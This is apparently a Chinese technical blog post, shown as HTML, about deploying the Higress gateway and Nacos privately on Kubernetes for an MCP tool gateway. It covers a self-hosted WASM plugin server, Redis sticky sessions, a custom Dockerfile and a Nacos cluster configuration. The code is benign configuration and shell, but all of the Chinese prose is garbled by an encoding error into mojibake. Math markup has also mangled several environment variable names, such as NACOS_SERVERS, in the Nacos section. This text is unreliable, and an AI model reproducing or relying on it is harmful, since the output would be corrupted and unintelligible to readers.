<p>Higress å’Œ Nacos éƒ½æ˜¯äº‘åŸç”Ÿçš„åº”ç”¨ï¼Œåœ¨éƒ¨ç½²æ–¹é¢ï¼Œè‡ªç„¶é€‰æ‹©ä½¿ç”¨ K8s é›†ç¾¤è¿›è¡Œäº‘åŸç”Ÿéƒ¨ç½²ã€‚åŒæ—¶å¾ˆå¤šä¼ä¸šæœ‰è‡ªå·±çš„ä¸“å±ç”Ÿäº§ç½‘ç»œç¯å¢ƒï¼Œä¸€èˆ¬å’Œå¤–ç½‘ä¸é€šï¼Œå› æ­¤æœ¬æ–‡ä¼šå›´ç»•å¦‚ä½•åˆ©ç”¨ç¤¾åŒºç‰ˆæœ¬çš„ Higress å’Œ Nacosï¼ˆApache-2.0 å¼€æºåè®®ï¼‰è¿›è¡Œç§æœ‰åŒ–éƒ¨ç½²ã€‚å› ä¸ºå†…éƒ¨ç¯å¢ƒçš„é™åˆ¶ï¼Œæˆ‘ä»¬æ²¡æœ‰åŠæ³•ç›´æ¥é€šè¿‡ Helm æ“ä½œ K8s é›†ç¾¤è¿›è¡Œéƒ¨ç½²ï¼Œå› æ­¤æœ¬æ–‡ä¼šå›´ç»•å¦‚ä½•åŸºäº Higress å’Œ Nacos çš„ docker é•œåƒåœ¨ K8s é›†ç¾¤ä¸Šè¿›è¡Œåˆ†è§’è‰²éƒ¨ç½²ã€‚</p>
<p>é€šè¿‡è¿™å¥—è‡ªå»ºçš„ç½‘å…³æœåŠ¡ï¼Œä½¿ç”¨é…ç½®å³å¯å®ç°é›¶ä»£ç æ‰©å±• Toolï¼Œæ–°åº”ç”¨çš„æ³¨å†Œã€åº”ç”¨ä¸‹é¢å·¥å…·çš„æ‰©å±•ã€å·¥å…· prompt æ›´æ–°éªŒè¯éƒ½èƒ½é€šè¿‡æœåŠ¡é›†æˆçš„å¯è§†åŒ–æ§åˆ¶å°ï¼Œæ›´æ–°å‘å¸ƒé…ç½®å¿«é€Ÿå®Œæˆï¼Œ<strong>æ¥å…¥æ–¹å¼æå…¶ç®€å•ï¼æ›´æ–°éªŒè¯æå…¶å¿«é€Ÿï¼</strong> åŒæ—¶åˆ©ç”¨ Nacos çš„å‘½åç©ºé—´èƒ½åŠ›å¯ä»¥åšåˆ°æœåŠ¡å’Œå·¥å…·é›†çš„éš”ç¦»ï¼Œç»™ä¸åŒçš„ç”¨æˆ·æä¾›ä¸åŒçš„ MCP å·¥å…·é›†ã€‚</p>
<h2 data-id="heading-1">ç§æœ‰åŒ–éƒ¨ç½²</h2>
<h3 data-id="heading-2">Higress</h3>
<p>Higress æ”¯æŒä¸‰ç§éƒ¨ç½²æ–¹å¼ï¼šHelmã€docker compose å’ŒåŸºäº all-in-one çš„Â docker é•œåƒè¿›è¡Œéƒ¨ç½²ã€‚Higress å®˜æ–¹æ¨èä½¿ç”¨ Helm çš„æ–¹å¼è¿›è¡Œç”Ÿäº§ç¯å¢ƒçš„éƒ¨ç½²ï¼Œå°†ä¾èµ–çš„æ¨¡å—éƒ¨ç½²åœ¨ä¸åŒçš„ pod ä¸Šã€‚è€Œå› ä¸Šè¿°ç¯å¢ƒåŸå› ï¼Œè¿™é‡Œé€‰æ‹©ä½¿ç”¨ç¬¬ä¸‰ç§åŸºäº all-in-one çš„ dockerÂ é•œåƒÂ Dockerfile <strong>[</strong> <strong>1]</strong> è¿›è¡Œéƒ¨ç½²ï¼Œå°† Higress ä¾èµ–çš„ç»„ä»¶ä»¥è¿›ç¨‹çš„æ–¹å¼éƒ¨ç½²åœ¨åŒä¸€ pod ä¸Šé¢ï¼Œé€šè¿‡å¤šå‰¯æœ¬çš„æ–¹å¼å®ç°æœåŠ¡é«˜å¯ç”¨ï¼Œä¹Ÿå®ç°äº†å¯¹ K8s é›†ç¾¤ Ingress çš„æ— ä¾µå…¥å¼éƒ¨ç½²ã€‚</p>
<p>æˆ‘ä»¬å…ˆå°è¯•ç›´æ¥å¼•ç”¨ docker é•œåƒè¿›è¡Œéƒ¨ç½²æ—¶ï¼Œä¼šæŠ¥ WASM çš„æ’ä»¶é”™è¯¯ï¼ŒæŸ¥çœ‹æŠ¥é”™ä¿¡æ¯æ˜¯é€šè¿‡ oci åœ°å€å»ä¸‹è½½ WASM æ’ä»¶çš„æ—¶å€™å‡ºç°äº†é—®é¢˜ã€‚åŒæ—¶ Higress å®ç° MCP åŠŸèƒ½ä¹Ÿä¾èµ–äº† WASM æ’ä»¶ï¼Œè¿™æ˜¯ä¸€ä¸ªç»•ä¸å¼€çš„é—®é¢˜ã€‚</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">FROM</span>Â higress<span class="hljs-operator">-</span>registry.cn<span class="hljs-operator">-</span>hangzhou.cr.aliyuncs.com<span class="hljs-operator">/</span>higress<span class="hljs-operator">/</span><span class="hljs-keyword">all</span><span class="hljs-operator">-</span><span class="hljs-keyword">in</span><span class="hljs-operator">-</span><span class="hljs-keyword">one</span>:latest
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1242b0ea9ed342978a58e041aad988b0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765870494&amp;x-signature=p7%2BTDqnxe1fKmLCkkM2HaXQthOU%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<h4 data-id="heading-3">WASM æ’ä»¶ç‹¬ç«‹éƒ¨ç½²</h4>
<p>Higress çš„Â plugin-server <strong>[</strong> <strong>2]</strong> é¡¹ç›®å°±æ˜¯ä¸ºäº†â€œè§£å†³ç§æœ‰åŒ–éƒ¨ç½² Higress ç½‘å…³æ—¶æ‹‰å–æ’ä»¶çš„ç—›ç‚¹ï¼Œä¼˜åŒ–äº†æ’ä»¶çš„ä¸‹è½½ä¸ç®¡ç†æ•ˆç‡â€ï¼Œä½¿ Higress é€šè¿‡ http çš„æ–¹å¼å»ä¸‹è½½ç‹¬ç«‹éƒ¨ç½²çš„æ’ä»¶åº“ï¼Œè€Œä¸æ˜¯é€šè¿‡ oci å»è®¿é—®å¤–éƒ¨å…¬å¼€ä»“åº“ï¼Œé¿å…å› ç½‘ç»œé—®é¢˜å¯¼è‡´æ’ä»¶æ‹‰å–ä¸ä¸‹æ¥ã€‚è§£å†³è¿‡ç¨‹ä¸»è¦åˆ†ä¸ºä»¥ä¸‹ä¸‰ä¸ªæ­¥éª¤ï¼š</p>
<p><strong>1ï¼‰ç§æœ‰åŒ–éƒ¨ç½² plugin-server</strong></p>
<pre><code class="hljs language-bash" lang="bash">FROMÂ higress-registry.cn-hangzhou.cr.aliyuncs.com/higress/plugin-server:1.0.0
</code></pre>
<p><strong>2ï¼‰ä¸º plugin-server é›†ç¾¤ç”³è¯· K8s Serviceï¼ˆCluster IPï¼‰</strong></p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span>
<span class="hljs-attr">kind:</span> <span class="hljs-string">Service</span>
<span class="hljs-attr">metadata:</span>
Â  <span class="hljs-attr">name:</span> <span class="hljs-string">higress-plugin-server</span>
Â  <span class="hljs-attr">namespace:</span> <span class="hljs-string">higress-system</span>
Â  <span class="hljs-attr">labels:</span>
Â  Â  <span class="hljs-attr">app:</span> <span class="hljs-string">higress-plugin-server</span>
Â  Â  <span class="hljs-attr">higress:</span> <span class="hljs-string">higress-plugin-server</span>
<span class="hljs-attr">spec:</span>
Â  <span class="hljs-attr">type:</span> <span class="hljs-string">ClusterIP</span>
Â  <span class="hljs-attr">ports:</span>
Â  Â  <span class="hljs-bullet">-</span> <span class="hljs-attr">port:</span> <span class="hljs-number">80</span>
Â  Â  Â  <span class="hljs-attr">protocol:</span> <span class="hljs-string">TCP</span>
Â  Â  Â  <span class="hljs-attr">targetPort:</span> <span class="hljs-number">8080</span>
Â  <span class="hljs-attr">selector:</span>
Â  Â  <span class="hljs-attr">app:</span> <span class="hljs-string">higress-plugin-server</span>
Â  Â  <span class="hljs-attr">higress:</span> <span class="hljs-string">higress-plugin-server</span>
</code></pre>
<p>K8s é›†ç¾¤å†…ç½®çš„ DNS ä¸ºæ­¤åˆ›å»ºçš„åŸŸåè§£æè®°å½•çš„æ ¼å¼ä¸ºÂ <code>&lt;service-name&gt;.&lt;namespace&gt;.svc.cluster.local</code>ã€‚</p>
<p>åœ¨æ²¡æœ‰ K8s çš„åœºæ™¯ä¸‹ä¹Ÿå¯ä»¥ä¸º plugin-server é›†ç¾¤ç”³è¯·å†…ç½‘ VIP æˆ–è€… SLB åšå¥½æœåŠ¡å‘ç°å’Œè´Ÿè½½å‡è¡¡ã€‚</p>
<p><strong>3ï¼‰ä¿®æ”¹ Higress å†…ç½®æ’ä»¶ä¸‹è½½åœ°å€</strong></p>
<p>ä¾ç…§ github ä¸­çš„ç¤ºä¾‹ï¼Œåœ¨åŸºäº Higress é•œåƒçš„é¡¹ç›® Dockerfile ä¸­å£°æ˜æ’ä»¶çš„ä¸‹è½½åœ°å€ã€‚è¿™é‡Œæœ‰ä¸ªåœ°æ–¹éœ€è¦æ³¨æ„ä¸‹ï¼Œreadme ä¸­ç»™å‡ºçš„ç¤ºä¾‹æ˜¯ç¯å¢ƒå˜é‡çš„æ ¼å¼ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/deef89984e3f456b86d4fa4f4bb6c730~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765870494&amp;x-signature=FJYl%2FgFANq4CkQ%2F4hLb1ea6osNs%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>åœ¨ Dockerfile ä¸­å£°æ˜éœ€è¦è½¬ä¹‰ä¸€ä¸‹ï¼Œ${name}/${version}Â çš„å½¢å¼æ‰å¯ä»¥è¢«æ­£ç¡®è§£æã€‚</p>
<pre><code class="hljs language-bash" lang="bash">...
<span class="hljs-comment"># æ¨¡ç‰ˆ</span>
ENV HIGRESS_ADMIN_WASM_PLUGIN_CUSTOM_IMAGE_URL_PATTERN=http://[ç”³è¯·çš„k8s serviceåœ°å€]/plugins/\<span class="hljs-variable">${name}</span>/\<span class="hljs-variable">${version}</span>/plugin.wasm
<span class="hljs-comment"># mcp wasm æ’ä»¶ä¸‹è½½åœ°å€</span>
ENV MCP_SERVER_WASM_IMAGE_URL=http://[ç”³è¯·çš„k8s serviceåœ°å€]/plugins/mcp-server/1.0.0/plugin.wasm
...
</code></pre>
<p>é…ç½®å®Œç‹¬ç«‹çš„æ’ä»¶ HTTP ä¸‹è½½åœ°å€åé‡æ–°éƒ¨ç½²ï¼Œåœ¨æœåŠ¡å™¨ä¸Šå¯ä»¥çœ‹åˆ° 8080 ç«¯å£ä»¥åŠ 8443 ç«¯å£å¯ä»¥è¢«æ­£å¸¸ç›‘å¬ï¼Œè¯´æ˜ Higress å…·å¤‡ä»£ç†å’Œç½‘å…³åŠŸèƒ½çš„æ ¸å¿ƒæ•°æ®é¢ç»„ä»¶å·²ç»å¯ä»¥æ­£å¸¸æœåŠ¡äº†ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/50a78e0794714d30956da299515be560~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765870494&amp;x-signature=OPioOJxDmJ%2Bnku7okYzm%2FQYjhw8%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>è§£å†³å®Œ WASM æ’ä»¶ä¸‹è½½é—®é¢˜ï¼ŒåŸºäº docker é•œåƒçš„ Higress æœåŠ¡å°±å¯ä»¥è¢«æˆåŠŸæ‹‰èµ·å¹¶è¿è¡Œäº†ã€‚åªä¸è¿‡åŸºäºè¿™ç§æ¨¡å¼éƒ¨ç½²çš„<strong>æ¯ä¸ª pod éƒ½æ˜¯ç‹¬ç«‹ã€å¯¹ç­‰ã€åŒ…å«å…¨éƒ¨ç»„ä»¶ã€åŠŸèƒ½å®Œæ•´çš„ Higress æœåŠ¡ï¼Œéœ€è¦é€šè¿‡å¤šå‰¯æœ¬çš„æ–¹å¼å®ç°é«˜å¯ç”¨ã€‚</strong></p>
<p>è¿™ç§éƒ¨ç½²æ¨¡å¼ä¸‹ï¼Œé€šè¿‡ Higress è‡ªèº«é›†æˆçš„æ§åˆ¶å°å»è¿ç»´æœåŠ¡&amp;æ›´æ”¹é…ç½®æ˜¯ä¸ç°å®çš„ï¼Œåªèƒ½æ“ä½œä¸€å°å®ä¾‹çš„é…ç½®å˜æ›´ï¼Œæ— æ³•è®©å®ä¾‹é—´è¿›è¡Œé…ç½®åŒæ­¥ã€‚å› æ­¤åœ¨è¿™ç§æ¨¡å¼ä¸‹çš„ç¼ºç‚¹æ˜¯ï¼Œåªèƒ½é€šè¿‡åœ¨é¡¹ç›®ä»£ç ä¸­ç»´æŠ¤é…ç½®æ–‡ä»¶ï¼Œéœ€è¦æ›´æ”¹æ—¶èµ°å‘å¸ƒæµç¨‹ï¼Œå°†é…ç½®å‘å¸ƒåˆ°æ¯å°å®ä¾‹ä¸Šé¢ã€‚ä¸è¿‡åœ¨æˆ‘ä»¬è¿™ä¸ªåœºæ™¯ä¸‹ï¼Œéœ€è¦å˜æ›´é…ç½®çš„æƒ…å†µä¸å¤šã€‚</p>
<h4 data-id="heading-4">ç²˜æ€§ä¼šè¯</h4>
<p>åœ¨ MCP SSE é€šä¿¡æ–¹å¼ä¸‹ï¼Œå¤©ç„¶éœ€è¦è§£å†³ç²˜æ€§ä¼šè¯çš„é—®é¢˜ï¼ŒHigress åŸºäº Redis å¸®æˆ‘ä»¬è§£å†³äº†è¿™ä¸ªé—®é¢˜ã€‚æå‰éƒ¨ç½²å¥½ Redis å®ä¾‹ä¹‹åï¼Œæ‰“å¼€ Higress çš„ MCP åŠŸèƒ½ï¼Œå¹¶å°† Redis é…ç½®æ›´æ–°è¿›å»ï¼Œé‡æ–°éƒ¨ç½²ä¸€ä¸‹å°±å¯ä»¥ä½¿ç”¨ MCP çš„åŠŸèƒ½äº†ã€‚</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-string">...</span>
<span class="hljs-attr">data:</span>
Â  <span class="hljs-attr">higress:</span> <span class="hljs-string">|-</span>
Â  Â  <span class="hljs-attr">mcpServer:</span>
Â  Â  Â Â <span class="hljs-string">enable:</span>Â <span class="hljs-literal">true</span>
Â  Â  Â  <span class="hljs-attr">sse_path_suffix:</span> <span class="hljs-string">/sse</span>
Â  Â  Â  <span class="hljs-attr">redis:</span>
Â  Â  Â  Â  <span class="hljs-attr">address:</span> <span class="hljs-string">xxx.redis.zhangbei.rds.aliyuncs.com:6379</span>
Â  Â  Â  Â  <span class="hljs-string">username:</span>Â <span class="hljs-string">""</span>
Â  Â  Â  Â  <span class="hljs-string">password:</span>Â <span class="hljs-string">"xxx"</span>
Â  Â  Â  Â  <span class="hljs-attr">db:</span> <span class="hljs-number">0</span>
<span class="hljs-string">...</span>
</code></pre>
<p>è¿™ä»½é…ç½®æ–‡ä»¶å¯ä»¥ç»´æŠ¤åœ¨è‡ªå·±çš„åŸºäº Higress é•œåƒçš„é¡¹ç›®ä¸­ï¼Œåœ¨éƒ¨ç½²çš„æ—¶å€™å°†é…ç½®æ–‡ä»¶ COPY åˆ°æŒ‡å®šç›®å½•ï¼ˆè¿™ç§éƒ¨ç½²æ¨¡å¼ä¸‹ï¼Œæ‰€æœ‰çš„é…ç½®æ–‡ä»¶éƒ½åº”è¯¥è¿™ä¹ˆåšï¼‰ã€‚</p>
<pre><code class="hljs language-bash" lang="bash">...
<span class="hljs-comment"># custom config</span>
COPY config/configmaps/higress-config.yaml /data/configmaps/higress-config.yaml
COPY config/mcpbridges/default.yaml /data/mcpbridges/default.yaml
COPY config/secrets/higress-console.yaml /data/secrets/higress-console.yaml
RUNÂ <span class="hljs-built_in">chmod</span>Â +x /data/configmaps/higress-config.yaml &amp;&amp; \
Â  Â Â <span class="hljs-built_in">chmod</span>Â +x /data/secrets/higress-console.yaml &amp;&amp; \
Â  Â Â <span class="hljs-built_in">chmod</span>Â +x /data/mcpbridges/*
...
</code></pre>
<p>å½“æ•´ä¸ª MCP ç½‘å…³æ­å»ºå®Œå¹¶ä½¿ç”¨çš„æ—¶å€™ï¼Œåœ¨ redis ä¸Šé€šè¿‡Â PSUBSCRIBE mcp-server-sse:*Â å‘½ä»¤å¯ä»¥çœ‹åˆ°å¦‚ä¸‹çš„è°ƒç”¨ä¿¡æ¯ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3f181283db3440f4881d64258ccd6e0b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765870494&amp;x-signature=aIZvWhrez%2Fk6fyxcAJMGlTj3kbk%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<h4 data-id="heading-5">è‡ªå®šä¹‰æ„å»ºé•œåƒ</h4>
<p>å®˜æ–¹æ„å»ºå‡ºæ¥çš„é•œåƒä¸€èˆ¬ä¼šè¦æ±‚ä½“ç§¯å°ï¼Œæ»¡è¶³æœ€å°è¿è¡Œè¦æ±‚ï¼Œæ‰€ä»¥å¾ˆå¤šåŠŸèƒ½å…¶å®å¹¶ä¸é›†æˆåœ¨ Higress çš„é•œåƒä¸­ã€‚å¦‚æœä½ çš„ä¼ä¸šæœ‰è‡ªå·±çº¦å®šçš„é€šç”¨é•œåƒï¼Œæˆ–è€…æ˜¯æƒ³åœ¨åŸæœ¬çš„åŸºç¡€ä¸Šé›†æˆä¸€äº›æ–°çš„åŠŸèƒ½ï¼Œå¦‚ä½¿ç”¨é˜¿é‡Œäº‘çš„ <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.aliyun.com%2Fproduct%2Fsls%3Fspm%3Da1z389.11499242.0.0.65452413PLWe13%26utm_content%3Dg_1000408139" target="_blank" title="https://www.aliyun.com/product/sls?spm=a1z389.11499242.0.0.65452413PLWe13&amp;utm_content=g_1000408139" ref="nofollow noopener noreferrer">SLS</a>ã€<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.aliyun.com%2Fproduct%2Fcms%3Fspm%3Da1z389.11499242.0.0.65452413vvcY0e%26utm_content%3Dg_1000408141" target="_blank" title="https://www.aliyun.com/product/cms?spm=a1z389.11499242.0.0.65452413vvcY0e&amp;utm_content=g_1000408141" ref="nofollow noopener noreferrer">äº‘ç›‘æ§</a>ç­‰åŠŸèƒ½ï¼Œå°±éœ€è¦æ ¹æ® all-in-one é•œåƒçš„ Dockerfile å†…å®¹è¿›è¡Œè‡ªå®šä¹‰æ„å»ºã€‚è¿™é‡Œæœ‰ä¸ªæ³¨æ„çš„ç‚¹æ˜¯ï¼ŒHigress ä¸­çš„ envoy æ¨¡å—è¦æ±‚çš„ glibc æ˜¯ 2.18 åŠä»¥ä¸Šç‰ˆæœ¬ã€‚</p>
<p>å…¶å®åªéœ€è¦å°† Higress çš„ Dockerfile æ–‡ä»¶å†…å®¹ç§»æ¤è¿‡æ¥å°±è¡Œï¼Œç„¶å<strong>å†å£°æ˜ä¸‹ç‹¬ç«‹éƒ¨ç½²çš„ WASM æ’ä»¶ä¸‹è½½åœ°å€</strong>ï¼Œå°±èƒ½å®ç°åŸºäºæŒ‡å®šé•œåƒè¿›è¡Œ Higress è‡ªå®šä¹‰æ„å»ºæ‰“åŒ…éƒ¨ç½²äº†ã€‚</p>
<p>Higress æœåŠ¡æ­å»ºå¥½åï¼Œå°±å¯ä»¥èµ°å¯¹å¤–å…¬ç½‘è®¿é—®çš„æµç¨‹äº†ï¼šï¼ˆ1ï¼‰ä¸€ä¸ªæ˜¯ç»‘å®š 8001 ç«¯å£ï¼Œé€šè¿‡ Higress æ§åˆ¶å°è¿›è¡ŒæŸ¥çœ‹ç›¸å…³é…ç½®çš„åŸŸåï¼Œé™åˆ¶ä¸ºåªå…è®¸å†…ç½‘è®¿é—®ã€‚æ³¨ï¼šè¿™ç§æ¨¡å¼ä¸‹æ— æ³•é€šè¿‡æ§åˆ¶å°ç›´æ¥å»æ›´æ”¹é…ç½®ï¼›ï¼ˆ2ï¼‰å¦ä¸€ä¸ªæ˜¯ç»‘å®š 8080 ç«¯å£ï¼Œå¯¹å¤–æä¾› MCP ç½‘å…³æœåŠ¡çš„åŸŸåã€‚</p>
<p>å®Œæ•´çš„ Dockerfile å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">FROM [ä¼ä¸šå†…éƒ¨åŸºç¡€é•œåƒ]
<span class="hljs-comment"># ä¸‹é¢ä¸º Higress all-in-one dockerfileä¸­çš„å†…å®¹</span>
ARG HUB=higress-registry.cn-hangzhou.cr.aliyuncs.com/higress
...
<span class="hljs-comment"># æ¨¡ç‰ˆ</span>
ENV HIGRESS_ADMIN_WASM_PLUGIN_CUSTOM_IMAGE_URL_PATTERN=http://[ç”³è¯·çš„k8s serviceåœ°å€]/plugins/\<span class="hljs-variable">${name}</span>/\<span class="hljs-variable">${version}</span>/plugin.wasm
<span class="hljs-comment"># mcp wasm æ’ä»¶ä¸‹è½½åœ°å€</span>
ENV MCP_SERVER_WASM_IMAGE_URL=http://[ç”³è¯·çš„k8s serviceåœ°å€]/plugins/mcp-server/1.0.0/plugin.wasm
...
<span class="hljs-comment"># æ³¨æ„ dockerfile ä¸­ä¼šå» github ä¸‹è½½å¯¹åº”å¤„ç†å™¨æ¶æ„ä¸‹çš„ yq æ¨¡å—ï¼Œä¼ä¸šå†…ç½‘ç¯å¢ƒä¸‹å¯ä»¥æå‰ä¸‹è½½ä¸‹æ¥</span>
COPY ./yq_linux_[<span class="hljs-built_in">arch</span>] /usr/local/bin/yq
...
<span class="hljs-comment"># custom config</span>
COPY config/configmaps/higress-config.yaml /data/configmaps/higress-config.yaml
COPY config/mcpbridges/default.yaml /data/mcpbridges/default.yaml
COPY config/secrets/higress-console.yaml /data/secrets/higress-console.yaml
RUNÂ <span class="hljs-built_in">chmod</span>Â +x /data/configmaps/higress-config.yaml &amp;&amp; \
Â  Â Â <span class="hljs-built_in">chmod</span>Â +x /data/secrets/higress-console.yaml &amp;&amp; \
Â  Â Â <span class="hljs-built_in">chmod</span>Â +x /data/mcpbridges/*
...
</code></pre>
<h3 data-id="heading-6">Nacos</h3>
<p>Nacos çš„éƒ¨ç½²ç›¸å¯¹ç®€å•ï¼Œé™¤äº†é€šè¿‡ kubectl æˆ–è€… nacos-operator å·¥å…·ç›´æ¥æ“ä½œ K8s é›†ç¾¤éƒ¨ç½²å¤–ï¼Œè¿˜å¯ä»¥ç›´æ¥åŸºäº nacos-server çš„é•œåƒè¿›è¡Œéƒ¨ç½²Â Dockerfile <strong>[</strong> <strong>3]</strong> ã€‚å› ä¸Šæ–‡æåˆ°çš„å†…éƒ¨ç¯å¢ƒé—®é¢˜ï¼Œæˆ‘ä»¬è¿™é‡Œé€‰æ‹©åŸºäº nacos-server çš„é•œåƒï¼Œå°†æœåŠ¡éƒ¨ç½²äº K8s é›†ç¾¤ä¸Šé¢ã€‚</p>
<pre><code class="hljs language-bash" lang="bash">FROM nacos-registry.cn-hangzhou.cr.aliyuncs.com/nacos/nacos-server:latest
</code></pre>
<h4 data-id="heading-7">é›†ç¾¤æ¨¡å¼éƒ¨ç½²</h4>
<p>Nacos é›†ç¾¤æ¨¡å¼ä¸‹ä½¿ç”¨çš„ä¸€è‡´æ€§åè®®æ˜¯åŸºäº Raft å®ç°çš„ï¼Œå› æ­¤æœ€å°éœ€è¦éƒ¨ç½² 3 å°å®ä¾‹ã€‚</p>
<p>åœ¨å¼•ç”¨ nacos-server é•œåƒçš„ dockerfile ä¸­ï¼Œå£°æ˜ cluster çš„éƒ¨ç½²æ¨¡å¼ã€‚æˆ‘ä»¬æŸ¥çœ‹ nacos çš„å¯åŠ¨è„šæœ¬ï¼Œå‘ç°åœ¨ peer-finderï¼ˆæ’ä»¶ï¼‰ç›®å½•ä¸å­˜åœ¨çš„æƒ…å†µä¸‹ï¼Œå¦‚æœå®šä¹‰äº† <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi><mi>A</mi><mi>C</mi><mi>O</mi><msub><mi>S</mi><mi>S</mi></msub><mi>E</mi><mi>R</mi><mi>V</mi><mi>E</mi><mi>R</mi><mi>S</mi><mtext>å˜é‡ï¼Œä¼šå°†</mtext></mrow><annotation encoding="application/x-tex">NACOS_SERVERS å˜é‡ï¼Œä¼šå°† </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.02778em;">CO</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05764em;">S</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.00773em;">ER</span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mord mathnormal" style="margin-right:0.05764em;">ERS</span><span class="mord cjk_fallback">å˜é‡ï¼Œä¼šå°†</span></span></span></span></span>NACOS_SERVERS å˜é‡ä¸­çš„å€¼å†™å…¥ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><mi>L</mi><mi>U</mi><mi>S</mi><mi>T</mi><mi>E</mi><msub><mi>R</mi><mi>C</mi></msub><mi>O</mi><mi>N</mi><mi>F</mi><mtext>æ–‡ä»¶ä¸­ï¼Œ</mtext></mrow><annotation encoding="application/x-tex">CLUSTER_CONF æ–‡ä»¶ä¸­ï¼Œ</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.10903em;">LU</span><span class="mord mathnormal" style="margin-right:0.05764em;">STE</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0077em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.07153em;">C</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.13889em;">ONF</span><span class="mord cjk_fallback">æ–‡ä»¶ä¸­ï¼Œ</span></span></span></span></span>CLUSTER_CONF æ–‡ä»¶çš„é»˜è®¤è·¯å¾„æ˜¯ /home/nacos/conf/cluster.confï¼Œå…¶ä¸­å®šä¹‰çš„å°±æ˜¯ Nacos é›†ç¾¤çš„é™æ€æˆå‘˜åœ°å€åˆ—è¡¨ï¼Œå®ƒåœ¨é›†ç¾¤é¦–æ¬¡å¯åŠ¨æ—¶ä¼šè¢«è¯»å–ï¼Œç”¨äºå‘ŠçŸ¥æ¯ä¸ªèŠ‚ç‚¹â€œé‚»å±…â€åœ¨å“ªï¼Œä»è€Œè®©å®ƒä»¬èƒ½å¤Ÿäº’ç›¸å‘ç°ã€å»ºç«‹è¿æ¥ï¼Œå¹¶åˆå§‹åŒ– Raft ä¸€è‡´æ€§åè®®ã€‚</p>
<pre><code class="hljs language-bash" lang="bash">...
PLUGINS_DIR=<span class="hljs-string">"/home/nacos/plugins/peer-finder"</span>
<span class="hljs-keyword">function</span>Â <span class="hljs-function"><span class="hljs-title">print_servers</span></span>() {
Â  Â <span class="hljs-keyword">if</span>Â [[ ! -dÂ <span class="hljs-string">"<span class="hljs-variable">${PLUGINS_DIR}</span>"</span>Â ]];Â <span class="hljs-keyword">then</span>
Â  Â Â <span class="hljs-built_in">echo</span>Â <span class="hljs-string">""</span>Â &gt;<span class="hljs-string">"<span class="hljs-variable">$CLUSTER_CONF</span>"</span>
Â  Â Â <span class="hljs-keyword">for</span>Â serverÂ <span class="hljs-keyword">in</span>Â <span class="hljs-variable">${NACOS_SERVERS}</span>;Â <span class="hljs-keyword">do</span>
Â  Â  Â Â <span class="hljs-built_in">echo</span>Â <span class="hljs-string">"<span class="hljs-variable">$server</span>"</span>Â &gt;&gt;<span class="hljs-string">"<span class="hljs-variable">$CLUSTER_CONF</span>"</span>
Â  Â Â <span class="hljs-keyword">done</span>
Â Â <span class="hljs-keyword">else</span>
Â  Â  bashÂ <span class="hljs-variable">$PLUGINS_DIR</span>/plugin.sh
Â  Â Â <span class="hljs-built_in">sleep</span>Â 30
Â Â <span class="hljs-keyword">fi</span>
}
...
</code></pre>
